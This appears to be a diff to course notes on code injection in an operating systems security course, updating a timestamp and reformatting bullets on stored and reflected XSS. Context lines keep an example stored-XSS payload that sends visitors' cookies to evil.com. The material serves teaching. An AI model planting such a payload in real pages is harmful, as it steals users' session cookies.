@@ -6,7 +6,7 @@ slug: s4/operating-systems-security/code-injection
 prev: true
 next: true
 dateCreated: 2026-04-23T17:39:39.629Z
-lastUpdatedOn: 2026-06-27T08:46:52.690Z
+lastUpdatedOn: 2026-09-13T14:55:23.987Z
 ---
 
 Injection attacks occur when unsanitized user input alters program execution or interpretation.
@@ -47,8 +47,10 @@ Defense: never evaluate user input as code; disable `eval` where possible; enfor
 
 Attacker injects a script that executes in another user's browser.
 
-- Stored XSS: malicious script saved in the database and served to all visitors.
-- Reflected XSS: malicious script embedded in a URL and reflected in the response.
+- Stored XSS  
+  Malicious script saved in the database and served to all visitors.
+- Reflected XSS  
+  Malicious script embedded in a URL and reflected in the response.
 
 Example: comment field stores `<script>document.location='http://evil.com?c='+document.cookie</script>`.
 
